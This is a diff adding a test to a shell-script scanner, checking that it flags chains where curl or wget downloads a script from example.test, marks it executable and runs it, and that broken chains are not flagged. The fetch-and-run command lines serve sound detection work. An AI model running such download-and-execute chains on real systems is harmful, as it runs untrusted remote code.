@@ -165,6 +165,45 @@ describe("scan", () => {
     expect(result.findings.some((f) => f.category === "second_stage_payload")).toBe(true);
   });
 
+  it("links a static download output to chmod and execution of the same script", () => {
+    const stagedScripts = [
+      `curl -sO https://example.test/agent.sh
+       chmod +x agent.sh
+       bash agent.sh`,
+      `curl -fsSL https://example.test/agent -o /tmp/agent
+       chmod 755 /tmp/agent
+       /tmp/agent --install`,
+      `wget https://example.test/agent.sh -O ./agent.sh
+       chmod u+x ./agent.sh
+       sh ./agent.sh`,
+    ];
+    for (const source of stagedScripts) {
+      expect(scan(source).findings).toEqual(expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "chain.second-stage-downloaded-script",
+          category: "second_stage_payload",
+        }),
+      ]));
+    }
+
+    const hardNegatives = [
+      "curl -sO https://example.test/agent.sh",
+      "curl -sO https://example.test/agent.sh; chmod +x agent.sh",
+      "curl -sO https://example.test/agent.sh; chmod +x helper.sh; bash helper.sh",
+      "curl -o agent.sh https://example.test/a; chmod +x agent.sh; bash helper.sh",
+      "touch agent.sh; chmod +x agent.sh; bash agent.sh",
+      `download() { curl -o agent.sh https://example.test/a; }
+       chmod +x agent.sh
+       bash agent.sh`,
+      "echo 'curl -sO https://example.test/agent.sh; chmod +x agent.sh; bash agent.sh'",
+    ];
+    for (const source of hardNegatives) {
+      expect(scan(source).findings.some((finding) =>
+        finding.ruleId === "chain.second-stage-downloaded-script"
+      )).toBe(false);
+    }
+  });
+
   it("tracks a variable-derived archive through extraction and execution", () => {
     const result = scan(`
       archive_uri=https://example.test/tool.zip
